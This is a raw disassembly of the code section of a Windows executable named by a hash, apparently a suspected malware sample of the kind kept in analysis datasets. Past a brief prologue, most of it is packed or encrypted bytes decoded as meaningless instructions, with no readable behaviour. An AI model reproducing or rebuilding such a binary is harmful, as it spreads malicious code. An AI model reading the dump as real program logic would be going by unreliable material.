
30a6e1cd3776925d42c0372e55f0495d89a08d5e73f9b89f003c79d5c94169f3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x54
  401006:	mov    DWORD PTR [ebp-0x34],0x0
  40100d:	mov    DWORD PTR [ebp-0x4],0x0
  401014:	mov    DWORD PTR [ebp-0x50],0x0
  40101b:	mov    DWORD PTR [ebp-0x4c],0x0
  401022:	mov    DWORD PTR [ebp-0x30],0x0
  401029:	lea    eax,[ebp-0x48]
  40102c:	push   eax
  40102d:	call   DWORD PTR ds:0x416048
  401033:	movzx  ecx,WORD PTR [ebp-0x48]
  401037:	test   ecx,ecx
  401039:	je     0x401051
  40103b:	mov    edx,DWORD PTR [ebp-0x34]
  40103e:	push   edx
  40103f:	call   0x41576a
  401044:	add    esp,0x4
  401047:	call   0x4157f7
  40104c:	jmp    0x40247d
  401051:	(bad)  
  401052:	call   0x6c1ae599
  401057:	or     al,0xfb
  401059:	push   edi
  40105a:	les    edi,FWORD PTR [esi+0x5ae5dd04]
  401060:	sbb    BYTE PTR [ebp+0x62],al
  401063:	push   0xc057fb0c
  401068:	mov    esi,0xa51a9d04
  40106d:	sbb    BYTE PTR [ebp-0x26],al
  401070:	push   0xc057fb0c
  401075:	mov    esi,0xa51add04
  40107a:	sbb    BYTE PTR [ebp-0x26],al
  40107d:	push   0xc057fb0c
  401082:	mov    esi,0xa51add04
  401087:	sbb    BYTE PTR [ebp-0x26],al
  40108a:	push   0xc857fb0c
  40108f:	mov    edi,0xba14dd04
  401094:	mov    ds:0x5dcda4b,al
  401099:	ss jbe 0x401114
  40109c:	mov    edi,0xf13b1048
  4010a1:	jo     0x4010cf
  4010a3:	test   eax,0x38897c48
  4010a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010a9:	int3   
  4010aa:	gs mov al,0x3a
  4010ad:	(bad)  
  4010ae:	jns    0x4010db
  4010b0:	mov    ah,0x7
  4010b2:	js     0x40108f
  4010b4:	xor    eax,0xa8769ea5
  4010b9:	je     0x401040
  4010bb:	jno    0x4010e8
  4010bd:	cli    
  4010be:	sub    al,0x43
  4010c0:	test   al,0x77
  4010c2:	lods   eax,DWORD PTR ds:[esi]
  4010c3:	shl    DWORD PTR [eax-0x48],1
  4010c6:	xor    al,0xa8
  4010c8:	adc    eax,0xc68fe4f
  4010cd:	sti    
  4010ce:	push   edi
  4010cf:	sar    BYTE PTR [esi-0x4c2a58fc],0x96
  4010d6:	jnp    0x40114c
  4010d8:	adc    cl,dl
  4010da:	(bad)  
  4010dd:	arpl   WORD PTR [edx],di
  4010df:	jae    0x401143
  4010e1:	js     0x401120
  4010e3:	jbe    0x401121
  4010e5:	mov    ch,0x2e
  4010e7:	push   ebp
  4010e8:	das    
  4010e9:	sbb    eax,0xc70f379b
  4010ee:	sbb    dh,BYTE PTR [esi+0x3f4d073d]
  4010f4:	sub    BYTE PTR [edx+0x7c10d5],cl
  4010fa:	dec    ebx
  4010fb:	jge    0x4010c8
  4010fd:	cwde   
  4010fe:	loope  0x4010c6
  401100:	je     0x401128
  401102:	pusha  
  401103:	push   ss
  401104:	inc    ebp
  401105:	fldl2e 
  401107:	mov    ah,0xdd
  401109:	lds    esi,FWORD PTR [edx+0xc]
  40110c:	adc    ecx,0xffffffde
  40110f:	stc    
  401110:	mov    eax,0x63733a63
  401115:	js     0x401168
  401117:	jmp    0x1d3d:0x75ceb5a2
  40111e:	mov    gs,WORD PTR [edx+0x2b80c7a5]
  401124:	xchg   edx,eax
  401125:	pop    es
  401126:	adc    DWORD PTR [edx-0x721a757d],esp
  40112c:	out    0x0,al
  40112e:	and    eax,0xff98600b
  401133:	pop    ebx
  401134:	jmp    0xc6ae795f
  401139:	(bad)  [edi+0x7b70c673]
  40113f:	je     0x401151
  401141:	sar    ebx,1
  401143:	push   edi
  401144:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40114b:	inc    ebp
  40114c:	fisubr DWORD PTR [eax+0xc]
  40114f:	sti    
  401150:	push   edi
  401151:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401158:	inc    ebp
  401159:	fidivr DWORD PTR [eax]
  40115b:	dec    ecx
  40115c:	sti    
  40115d:	push   edi
  40115e:	mov    WORD PTR [edi-0x148322f9],?
  401164:	push   ebp
  401165:	or     bl,dl
  401167:	push   0xc057fb0c
  40116c:	mov    esi,0xa71a3d04
  401171:	sbb    DWORD PTR [esi-0x25],ecx
  401174:	bound  ecx,QWORD PTR [ebx+edi*8]
  401177:	mov    ch,0xc4
  401179:	mov    esi,0xa51c5904
  40117e:	sbb    BYTE PTR [ebp-0x26],al
  401181:	push   0xc057464f
  401186:	mov    esi,0xa51add14
  40118b:	sbb    BYTE PTR [eax-0x26],al
  40118e:	push   0xc057bb0c
  401193:	scas   al,BYTE PTR es:[edi]
  401194:	add    al,0xdd
  401196:	sbb    ah,BYTE PTR [edi+0x68df4518]
  40119c:	or     eax,0xbec057fb
  4011a1:	add    al,0xd8
  4011a3:	sbb    ah,BYTE PTR [eax+ebx*1+0xc68da45]
  4011aa:	sti    
  4011ab:	addr16 int3 
  4011ad:	mov    esi,0xa51ad904
  4011b2:	adc    bh,BYTE PTR [ebx-0x4f19722]
  4011b8:	pop    ss
  4011b9:	inc    ecx
  4011ba:	mov    esi,0xa51acd04
  4011bf:	or     BYTE PTR [ebp-0x26],al
  4011c2:	push   0xc057eb0c
  4011c7:	scas   al,BYTE PTR es:[edi]
  4011c8:	add    al,0xdd
  4011ca:	sbb    ah,BYTE PTR [ebp+0x68ca4518]
  4011d0:	or     al,0xfb
  4011d2:	push   edi
  4011d3:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4011da:	inc    ecx
  4011db:	fisub  DWORD PTR [esp+ecx*1-0x5e]
  4011df:	push   esp
  4011e0:	sar    BYTE PTR [esi-0x5aeee2fc],0x4d
  4011e7:	jp     0x4011c3
  4011e9:	push   0xc057fb0c
  4011ee:	mov    esi,0xa51add04
  4011f3:	sbb    BYTE PTR [ebp-0x26],al
  4011f6:	push   0xc057fb0c
  4011fb:	sahf   
  4011fc:	or     ch,bl
  4011fe:	add    ah,BYTE PTR [ebp+0x68da4518]
  401204:	or     al,0xfb
  401206:	push   edi
  401207:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40120e:	inc    ebp
  40120f:	fisubr DWORD PTR [eax+0xc]
  401212:	sti    
  401213:	push   edi
  401214:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40121b:	inc    ebp
  40121c:	fisubr DWORD PTR [eax+0xc]
  40121f:	sti    
  401220:	push   edi
  401221:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401228:	inc    ebp
  401229:	fisubr DWORD PTR [eax+0xc]
  40122c:	sti    
  40122d:	push   edi
  40122e:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401235:	inc    ebp
  401236:	fisubr DWORD PTR [eax+0xc]
  401239:	sti    
  40123a:	push   edi
  40123b:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401242:	inc    ebp
  401243:	fisubr DWORD PTR [eax+0xc]
  401246:	sti    
  401247:	push   edi
  401248:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40124f:	inc    ebp
  401250:	fisubr DWORD PTR [eax+0x22]
  401253:	(bad)  
  401254:	xor    bh,BYTE PTR [eax+0x1add04ca]
  40125a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40125b:	test   al,0x4e
  40125d:	fisubr DWORD PTR [eax+0x1c]
  401260:	sti    
  401261:	push   edi
  401262:	rcr    al,0x0
  401265:	fstp   QWORD PTR [edx]
  401267:	mov    eax,ds:0x2d8a4518
  40126c:	dec    edi
  40126d:	leave  
  40126e:	add    ecx,DWORD PTR [edi+0x1add04be]
  401274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401275:	sbb    BYTE PTR [ebp-0x26],ah
  401278:	push   0xb325d5ec
  40127d:	int3   
  40127e:	fstp   QWORD PTR [bp+si]
  401281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401282:	sbb    BYTE PTR ds:0x3b0c68da,ah
  401288:	pop    esp
  401289:	sar    BYTE PTR [esi-0x5ae522aa],0x72
  401290:	inc    ecx
  401291:	fisubr DWORD PTR [eax+0xc]
  401294:	sti    
  401295:	push   edi
  401296:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40129d:	inc    ebp
  40129e:	cli    
  40129f:	push   0xb2791b0c
  4012a4:	fld    TBYTE PTR [eax-0x4e]
  4012a7:	jns    0x40124e
  4012a9:	sbb    BYTE PTR [ebp-0x28],al
  4012ac:	push   0xcc77fb0c
  4012b1:	mov    esi,0xa51adf04
  4012b6:	sbb    cl,bh
  4012b8:	fisubr WORD PTR [eax+0xc]
  4012bb:	sti    
  4012bc:	push   edi
  4012bd:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4012c4:	inc    ebp
  4012c5:	fisubr DWORD PTR [eax]
  4012c7:	or     al,0xfb
  4012c9:	xchg   edi,eax
  4012ca:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4012d1:	inc    ebp
  4012d2:	fisubr DWORD PTR [eax+0xc]
  4012d5:	sti    
  4012d6:	push   edi
  4012d7:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4012de:	inc    ebp
  4012df:	fisubr DWORD PTR [eax+0xc]
  4012e2:	sti    
  4012e3:	push   edi
  4012e4:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4012eb:	inc    ebp
  4012ec:	fisubr DWORD PTR [eax+0xc]
  4012ef:	sti    
  4012f0:	push   edi
  4012f1:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4012f8:	inc    ebp
  4012f9:	fisubr DWORD PTR [eax+0xc]
  4012fc:	sti    
  4012fd:	push   edi
  4012fe:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401305:	inc    ebp
  401306:	fisubr DWORD PTR [eax+0xc]
  401309:	sti    
  40130a:	push   edi
  40130b:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401312:	inc    ebp
  401313:	fisubr DWORD PTR [eax+0xc]
  401316:	sti    
  401317:	push   edi
  401318:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40131f:	inc    ebp
  401320:	fisubr DWORD PTR [eax+0xc]
  401323:	sti    
  401324:	push   edi
  401325:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40132c:	inc    ebp
  40132d:	fisubr DWORD PTR [eax+0xc]
  401330:	sti    
  401331:	push   edi
  401332:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401339:	inc    ebp
  40133a:	fisubr DWORD PTR [eax+0xc]
  40133d:	sti    
  40133e:	push   edi
  40133f:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401346:	inc    ebp
  401347:	fisubr DWORD PTR [eax+0xc]
  40134a:	sti    
  40134b:	push   edi
  40134c:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401353:	inc    ebp
  401354:	fisubr DWORD PTR [eax+0xc]
  401357:	sti    
  401358:	push   edi
  401359:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401360:	inc    ebp
  401361:	fisubr DWORD PTR [eax+0xc]
  401364:	sti    
  401365:	push   edi
  401366:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40136d:	inc    ebp
  40136e:	fisubr DWORD PTR [eax+0xc]
  401371:	sti    
  401372:	push   edi
  401373:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40137a:	inc    ebp
  40137b:	fisubr DWORD PTR [eax+0xc]
  40137e:	sti    
  40137f:	push   edi
  401380:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401387:	inc    ebp
  401388:	fisubr DWORD PTR [eax+0xc]
  40138b:	sti    
  40138c:	push   edi
  40138d:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401394:	inc    ebp
  401395:	fisubr DWORD PTR [eax+0xc]
  401398:	sti    
  401399:	push   edi
  40139a:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013a1:	inc    ebp
  4013a2:	fisubr DWORD PTR [eax+0xc]
  4013a5:	sti    
  4013a6:	push   edi
  4013a7:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013ae:	inc    ebp
  4013af:	fisubr DWORD PTR [eax+0xc]
  4013b2:	sti    
  4013b3:	push   edi
  4013b4:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013bb:	inc    ebp
  4013bc:	fisubr DWORD PTR [eax+0xc]
  4013bf:	sti    
  4013c0:	push   edi
  4013c1:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013c8:	inc    ebp
  4013c9:	fisubr DWORD PTR [eax+0xc]
  4013cc:	sti    
  4013cd:	push   edi
  4013ce:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013d5:	inc    ebp
  4013d6:	fisubr DWORD PTR [eax+0xc]
  4013d9:	sti    
  4013da:	push   edi
  4013db:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013e2:	inc    ebp
  4013e3:	fisubr DWORD PTR [eax+0xc]
  4013e6:	sti    
  4013e7:	push   edi
  4013e8:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013ef:	inc    ebp
  4013f0:	fisubr DWORD PTR [eax+0xc]
  4013f3:	sti    
  4013f4:	push   edi
  4013f5:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  4013fc:	inc    ebp
  4013fd:	fisubr DWORD PTR [eax+0xc]
  401400:	sti    
  401401:	push   edi
  401402:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401409:	inc    ebp
  40140a:	fisubr DWORD PTR [eax+0xc]
  40140d:	sti    
  40140e:	push   edi
  40140f:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401416:	inc    ebp
  401417:	fisubr DWORD PTR [eax+0xc]
  40141a:	sti    
  40141b:	push   edi
  40141c:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401423:	inc    ebp
  401424:	fisubr DWORD PTR [eax+0xc]
  401427:	sti    
  401428:	push   edi
  401429:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  401430:	inc    ebp
  401431:	fisubr DWORD PTR [eax+0xc]
  401434:	sti    
  401435:	push   edi
  401436:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40143d:	inc    ebp
  40143e:	fisubr DWORD PTR [eax+0xc]
  401441:	sti    
  401442:	push   edi
  401443:	sar    BYTE PTR [esi-0x5ae522fc],0x18
  40144a:	inc    ebp
  40144b:	fisubr DWORD PTR [eax+0xc]
  40144e:	sti    
  40144f:	push   edi
  401450:	sar    BYTE PTR [esi-0x5aee6c51],0x37
  401457:	inc    ebp
  401458:	fidivr DWORD PTR [eax+0xc]
  40145b:	sti    
  40145c:	jge    0x4014c0
  40145e:	fs jo  0x4014c1
  401461:	push   ebp
  401462:	xchg   esi,eax
  401463:	or     ch,BYTE PTR [esi-0x1f]
  401466:	push   ebp
  401467:	jecxz  0x4014b7
  401469:	(bad)
  40146c:	pop    ebp
  40146d:	sub    al,0xc6
  40146f:	push   ss
  401470:	or     eax,DWORD PTR [edx]
  401472:	loope  0x4013f5
  401474:	aam    0x70
  401476:	adc    eax,0x92fe7cb1
  40147b:	(bad)  
  40147c:	sti    
  40147d:	(bad)  
  40147e:	xchg   ecx,eax
  40147f:	call   0x9b11:0xec18610b
  401486:	inc    edi
  401487:	aam    0x92
  401489:	and    eax,0x51fab80f
  40148e:	xor    al,0xb8
  401490:	push   ebp
  401491:	mov    ecx,?
  401493:	fadd   QWORD PTR [ecx-0x33]
  401496:	jmp    0xec15:0x9c2cf626
  40149d:	sbb    DWORD PTR [ecx],esi
  40149f:	in     al,dx
  4014a0:	imul   eax,DWORD PTR [ecx-0x3],0xffffffb5
  4014a4:	xchg   DWORD PTR [ebp+0x7ea15270],esi
  4014aa:	sbb    al,0x3c
  4014ac:	adc    al,0xeb
  4014ae:	cmp    edi,DWORD PTR [ebx]
  4014b0:	xor    al,ah
  4014b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014b3:	inc    ecx
  4014b4:	dec    edi
  4014b5:	pop    esi
  4014b6:	into   
  4014b7:	push   ebx
  4014b8:	or     BYTE PTR [ebx+0x22],0xb9
  4014bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014bd:	dec    edx
  4014be:	gs jge 0x401450
  4014c1:	(bad)  
  4014c3:	xchg   DWORD PTR [esi],eax
  4014c5:	fsub   DWORD PTR [esi+0x2fb8b811]
  4014cb:	cmp    al,0x66
  4014cd:	dec    eax
  4014ce:	mov    WORD PTR [edi+0x5dd92c99],ss
  4014d4:	xchg   ebx,eax
  4014d5:	stc    
  4014d6:	dec    edi
  4014d7:	xor    eax,0x1a47b7b3
  4014dc:	push   0xffffffdd
  4014de:	add    DWORD PTR [esi+0x3a],ebx
  4014e1:	xchg   ecx,eax
  4014e2:	call   0xf2fa:0x7a2c5c93
  4014e9:	jp     0x4014c2
  4014eb:	inc    esp
  4014ec:	xor    ebp,DWORD PTR [ecx+0x31]
  4014ef:	repz add bl,ah
  4014f2:	cmp    bh,BYTE PTR [esi+0x34c5a282]
  4014f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014f9:	push   0x70
  4014fb:	call   0x6d394308
  401500:	test   bh,al
  401502:	push   ebp
  401503:	enter  0xfed0,0xa8
  401507:	or     ch,ah
  401509:	push   eax
  40150a:	xchg   edx,eax
  40150b:	pusha  
  40150c:	iret   
  40150d:	data16 mov dh,0x58
  401510:	stos   DWORD PTR es:[edi],eax
  401511:	push   ebx
  401512:	push   cs
  401513:	arpl   WORD PTR [ecx-0x69],bx
  401516:	xor    BYTE PTR [edx-0xe31f406],ch
  40151c:	mov    ch,0xa4
  40151e:	and    ah,BYTE PTR [eax]
  401520:	or     esi,ebp
  401522:	mov    esi,0x7b6d1b4c
  401527:	in     eax,0x5e
  401529:	or     DWORD PTR gs:[bp+si-0x1e],edx
  40152e:	shl    eax,1
  401530:	inc    edi
  401531:	icebp  
  401532:	xchg   edx,eax
  401533:	jnp    0x4014d1
  401535:	fwait
  401536:	add    DWORD PTR [ebx+edx*1-0x7b5e9365],0x30438253
  401541:	ret    
  401542:	push   es
  401543:	push   ebp
  401544:	dec    edx
  401545:	mov    bl,BYTE PTR [ecx+0x716f197a]
  40154b:	rol    BYTE PTR [ebx+0x35],1
  40154e:	call   0x2efb:0x3f29bcea
  401555:	and    al,0xfa
  401557:	xor    ch,BYTE PTR [edi]
  401559:	or     cl,BYTE PTR [ebx]
  40155b:	inc    esp
  40155c:	xor    BYTE PTR [edx-0x34],ch
  40155f:	pop    esi
  401560:	jmp    0xdde47067
  401565:	ror    BYTE PTR [edi+0x1fe456d4],1
  40156b:	inc    ebp
  40156c:	and    esp,edi
  40156e:	lea    ecx,[ecx+0x76a46269]
  401574:	(bad)  
  401575:	ror    BYTE PTR [edi],1
  401577:	or     BYTE PTR ds:0x7e01de02,cl
  40157d:	mov    ah,0xb4
  40157f:	mov    edi,0x9d9f7ce9
  401584:	mov    ch,0x4
  401586:	lods   eax,DWORD PTR ds:[esi]
  401587:	mov    eax,ds:0x177b8a2
  40158c:	mov    ah,cl
  40158e:	sti    
  40158f:	mov    bh,0x2b
  401591:	test   BYTE PTR [eax-0x73],bl
  401594:	call   0xb30a:0xaad40f7c
  40159b:	xchg   ebp,eax
  40159c:	xchg   esi,eax
  40159d:	bound  ecx,QWORD PTR [eax-0x7be399c8]
  4015a3:	jl     0x401594
  4015a5:	jae    0x401614
  4015a7:	sar    dl,1
  4015a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015aa:	sub    BYTE PTR [esi+0x4d78a3d2],0x30
  4015b1:	cmp    ch,BYTE PTR [eax-0x207f8249]
  4015b7:	mov    gs,WORD PTR [edx+ebp*8]
  4015ba:	pop    ss
  4015bb:	and    ecx,DWORD PTR [edi+0x30]
  4015be:	and    esi,DWORD PTR [ebp-0x3137c1ad]
  4015c4:	xchg   ebp,eax
  4015c5:	nop
  4015c6:	mov    edx,0xe4ff6a83
  4015cb:	aam    0x7d
  4015cd:	jge    0x40161c
  4015cf:	not    BYTE PTR [edi]
  4015d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d2:	outs   dx,BYTE PTR ds:[esi]
  4015d3:	loop   0x40157f
  4015d5:	and    esp,DWORD PTR [edx]
  4015d7:	outs   dx,BYTE PTR ds:[esi]
  4015d8:	lahf   
  4015d9:	add    BYTE PTR [esi],cl
  4015db:	cmp    ch,dh
  4015dd:	mov    bh,0x74
  4015df:	daa    
  4015e0:	icebp  
  4015e1:	lea    ebx,[edx+0x434ee33]
  4015e7:	(bad)  
  4015e8:	outs   dx,BYTE PTR ds:[esi]
  4015e9:	aaa    
  4015ea:	test   eax,0x80ea9743
  4015ef:	cmp    DWORD PTR [eax-0x43],0x46
  4015f3:	pop    ss
  4015f4:	fs je  0x401648
  4015f7:	xchg   BYTE PTR [esi-0x51],bl
  4015fa:	sahf   
  4015fb:	rol    BYTE PTR ss:[edi+eiz*4+0x58],1
  401600:	mov    ecx,0xede9c1b0
  401605:	push   0xa97872ab
  40160a:	sub    bh,BYTE PTR [ecx+ebx*2]
  40160d:	and    edi,DWORD PTR [edi+eiz*4+0x48af1dbc]
  401614:	or     al,0x2e
  401616:	mov    ebp,0xc31fd997
  40161b:	ins    BYTE PTR es:[edi],dx
  40161c:	adc    DWORD PTR [edi+0x3f],eax
  40161f:	xchg   esp,eax
  401621:	rcl    dl,cl
  401623:	jmp    0x40163c
  401625:	mov    edi,0xe5f40b3d
  40162a:	add    ebp,DWORD PTR [edx]
  40162c:	into   
  40162d:	mov    esp,0x3e01d7f2
  401632:	mov    DWORD PTR [edx],ecx
  401634:	aad    0x84
  401636:	aas    
  401637:	pusha  
  401638:	popa   
  401639:	pop    edx
  40163a:	push   0x12
  40163c:	xor    eax,0xd1ab4481
  401641:	xchg   BYTE PTR [eax-0x2275f56e],dh
  401647:	adc    ah,dh
  401649:	sti    
  40164a:	xchg   edx,eax
  40164b:	in     al,dx
  40164c:	jecxz  0x4015f5
  40164e:	ret    
  40164f:	cmp    eax,0xa398ff6
  401654:	push   edx
  401655:	jae    0x401695
  401657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401658:	and    ecx,DWORD PTR ds:0xf63b1891
  40165e:	call   0xedc56802
  401663:	fwait
  401664:	test   al,0x16
  401666:	popa   
  401667:	add    DWORD PTR [ecx+0x49],esp
  40166a:	sbb    eax,0x52b8ce65
  40166f:	cmp    dl,dh
  401671:	in     eax,dx
  401672:	push   ebp
  401673:	or     edx,edi
  401675:	push   edi
  401676:	pop    ds
  401677:	jl     0x401648
  401679:	sub    cl,al
  40167b:	xor    esp,esi
  40167d:	hlt    
  40167e:	mov    bl,0x83
  401680:	add    DWORD PTR [ecx],esp
  401682:	add    edx,edi
  401684:	xor    al,0xdb
  401686:	lea    ebx,[edx+0x243bdf29]
  40168c:	pushf  
  40168d:	or     eax,0xfa07417
  401692:	in     al,0xbe
  401694:	sti    
  401695:	(bad)  
  401696:	sar    bl,cl
  401698:	and    BYTE PTR [ebx-0x66],al
  40169b:	or     eax,0xbe8e5f34
  4016a0:	test   BYTE PTR [edx-0x2d],0x91
  4016a4:	fadd   st(0),st
  4016a6:	or     eax,0x692ebcd1
  4016ab:	inc    eax
  4016ac:	icebp  
  4016ad:	add    ebp,DWORD PTR [edx-0x716005c6]
  4016b3:	mov    ah,0x8c
  4016b5:	(bad)  
  4016b6:	lock jp 0x4016a4
  4016b9:	xor    eax,0xb59427d6
  4016be:	inc    edi
  4016bf:	inc    edx
  4016c0:	je     0x40173f
  4016c2:	call   0xea2f:0x52116c04
  4016c9:	sbb    al,BYTE PTR [eax-0x4d]
  4016cc:	out    0x75,al
  4016ce:	cmp    esp,DWORD PTR [edi+0x1c]
  4016d1:	mov    DWORD PTR ss:0xdd5,ebp
  4016d7:	lods   eax,DWORD PTR ds:[esi]
  4016d8:	sahf   
  4016d9:	adc    ebx,DWORD PTR [edx+edx*4-0x618655bc]
  4016e0:	lahf   
  4016e1:	gs add al,0xd0
  4016e4:	into   
  4016e5:	push   ebp
  4016e6:	dec    edi
  4016e7:	pusha  
  4016e8:	rcl    al,cl
  4016ea:	xor    esp,DWORD PTR [ecx+0x67]
  4016ed:	aaa    
  4016ee:	xor    BYTE PTR [esi],cl
  4016f0:	sahf   
  4016f1:	add    al,0xa1
  4016f3:	mov    ds:0x33f48dcb,al
  4016f8:	or     DWORD PTR [edi-0x4b],ebp
  4016fb:	dec    esi
  4016fc:	fisttp DWORD PTR [eax]
  4016fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ff:	ret    
  401700:	pop    ebp
  401701:	out    0x59,eax
  401703:	add    ah,cl
  401705:	xchg   ecx,eax
  401706:	push   es
  401707:	inc    edx
  401708:	adc    esp,DWORD PTR [ebp+0x2e]
  40170b:	pushf  
  40170c:	fucom  st(2)
  40170e:	or     DWORD PTR [esi],esp
  401710:	cld    
  401711:	xor    eax,0x63443877
  401716:	cdq    
  401717:	pop    ss
  401718:	ficom  WORD PTR [ecx-0x39ec287b]
  40171e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171f:	jmp    0xf819:0xd06ab375
  401726:	xchg   esp,eax
  401727:	shl    eax,1
  401729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40172a:	jae    0x4016c1
  40172c:	repz enter 0xb520,0x22
  401731:	sahf   
  401732:	in     eax,0xaf
  401734:	mov    ebx,0x3c6441a8
  401739:	mov    bl,0x8d
  40173b:	stc    
  40173c:	cli    
  40173d:	adc    dl,ah
  40173f:	fld    QWORD PTR [esi+0x63e0a7a0]
  401745:	mov    ds:0xc0175488,al
  40174a:	xchg   edi,eax
  40174b:	aad    0x9f
  40174d:	dec    esp
  40174e:	jp     0x401759
  401750:	inc    edi
  401751:	mov    ebp,0x998dcd68
  401756:	repnz aad 0x4f
  401759:	repnz mov bh,0xde
  40175c:	and    edx,DWORD PTR [ecx+0x4c62dc45]
  401762:	push   ebp
  401763:	sbb    al,0xfc
  401766:	and    eax,0x35ec8ab9
  40176b:	das    
  40176c:	mov    ch,0xd5
  40176e:	xor    eax,0x3c34e821
  401773:	addr16 xchg edx,eax
  401775:	popa   
  401776:	xor    BYTE PTR [edi-0x359768a4],ah
  40177c:	mov    ebp,0xf5b6a14a
  401781:	adc    ah,BYTE PTR [ebp-0x197f4a32]
  401787:	daa    
  401788:	cs ins DWORD PTR es:[edi],dx
  40178a:	xchg   ebp,eax
  40178b:	mov    dl,0x4e
  40178d:	pop    ebx
  40178e:	mov    eax,DWORD PTR [eax+0x6a288690]
  401794:	stos   DWORD PTR es:[edi],eax
  401795:	jmp    0x40176a
  401797:	fwait
  401798:	inc    eax
  401799:	fadd   DWORD PTR [edx+0x1]
  40179c:	xor    DWORD PTR [ebp-0x5f],edx
  40179f:	add    DWORD PTR [eax-0x2126c5eb],edi
  4017a5:	and    BYTE PTR [edi-0x7a300e35],cl
  4017ab:	or     eax,0x4876369a
  4017b0:	pushf  
  4017b1:	mov    bl,0x8d
  4017b3:	push   edi
  4017b4:	js     0x401736
  4017b6:	ficom  WORD PTR [edi]
  4017b8:	add    BYTE PTR [ecx+0x7b85cf17],dh
  4017be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017bf:	dec    esi
  4017c0:	dec    BYTE PTR [eax]
  4017c2:	cdq    
  4017c3:	and    cl,BYTE PTR [edx]
  4017c5:	repz in al,0x7f
  4017c8:	and    DWORD PTR [ebx+0x20],0x105f6cdb
  4017cf:	mov    ah,0xa0
  4017d1:	mov    ?,ebx
  4017d3:	push   eax
  4017d4:	sbb    BYTE PTR [ecx-0x9],0xc1
  4017d8:	xchg   esi,eax
  4017d9:	das    
  4017da:	int3   
  4017db:	daa    
  4017dc:	loope  0x4017c5
  4017de:	push   ebp
  4017df:	mov    cl,BYTE PTR [esi-0x41a1c7cb]
  4017e5:	dec    ebx
  4017e6:	or     eax,0xe2eb44be
  4017eb:	sub    al,0x79
  4017ed:	jo     0x401778
  4017ef:	mov    al,0x30
  4017f1:	in     eax,0x99
  4017f3:	cmp    ecx,eax
  4017f5:	adc    edx,ebx
  4017f7:	and    al,0xd1
  4017f9:	inc    eax
  4017fa:	push   ss
  4017fb:	dec    esi
  4017fc:	bound  ebp,QWORD PTR [ecx-0x758325a3]
  401802:	test   al,0xa8
  401804:	dec    edx
  401805:	add    edx,DWORD PTR [eax+0x56]
  401808:	mov    WORD PTR [eax-0x2f],cs
  40180b:	(bad)
  40180e:	sbb    al,0x89
  401810:	ror    BYTE PTR [esp+eax*2+0x64],0xce
  401815:	xor    al,0xe9
  401817:	shr    BYTE PTR [ebp-0x4e7ad848],1
  40181d:	call   0xa7b6cbe7
  401822:	or     DWORD PTR [ecx+edx*8+0x76f8ae8e],edx
  401829:	fs inc ecx
  40182b:	or     al,0x34
  40182d:	ja     0x401886
  40182f:	adc    esi,DWORD PTR [ebp+0x65eb59ca]
  401835:	iret   
  401836:	pop    es
  401837:	add    al,0xf8
  401839:	adc    ebx,DWORD PTR [edx+0x4999668c]
  40183f:	xor    ecx,esp
  401841:	adc    dh,BYTE PTR ds:0x81be1826
  401847:	inc    edi
  401848:	shl    DWORD PTR [eax+eiz*2],1
  40184b:	imul   ebx,DWORD PTR [edi],0x62
  40184e:	ss and eax,0x90b33afc
  401854:	xchg   ebx,eax
  401855:	push   cs
  401856:	xor    eax,0xe0c74f10
  40185b:	lahf   
  40185c:	sub    DWORD PTR [ebp+0x1e3d45f4],eax
  401862:	ror    ecx,cl
